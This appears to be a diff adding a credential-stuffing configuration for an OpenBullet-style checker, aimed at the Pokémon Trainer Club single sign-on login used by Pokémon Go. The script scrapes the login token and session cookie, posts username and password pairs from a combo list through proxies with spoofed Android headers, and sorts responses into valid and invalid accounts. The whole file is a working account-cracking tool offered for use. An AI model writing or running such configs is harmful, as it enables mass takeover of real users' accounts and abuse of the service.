@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "PokeMon Go",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-20T22:06:17.6809186+02:00",
+  "AdditionalInfo": "",
+  "Author": "INFINITEY",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://sso.pokemon.com/sso/login?service=https%3A%2F%2Fsso.pokemon.com%2Fsso%2Foauth2.0%2FcallbackAuthorize&locale=en_US" 
+  
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N9005 Build/NJH47F)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#TOKEN PARSE "<SOURCE>" LR "lt\": \"" "\"," -> VAR "TOKEN" 
+#JSESSIONID PARSE "<COOKIES(JSESSIONID)>" LR "" "" -> VAR "JSESSIONID" 
+#LOGIN REQUEST POST "https://sso.pokemon.com/sso/login?service=http%3A%2F%2Fsso.pokemon.com%2Fsso%2Foauth2.0%2FcallbackAuthorize&locale=en_US" 
+  CONTENT "lt=<TOKEN>&execution=e1s1&_eventId=submit&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "JSESSIONID: <JSESSIONID>;" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N9005 Build/NJH47F)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Unity-Version: 2017.4.6f1" 
+  HEADER "Host: sso.pokemon.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 114" 
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your username or password is incorrect." 
+  KEYCHAIN Success OR 
+    KEY "applicationTime\":2,\"" 
+    KEY "The application you attempted to authenticate to is not authorized to use CAS." 
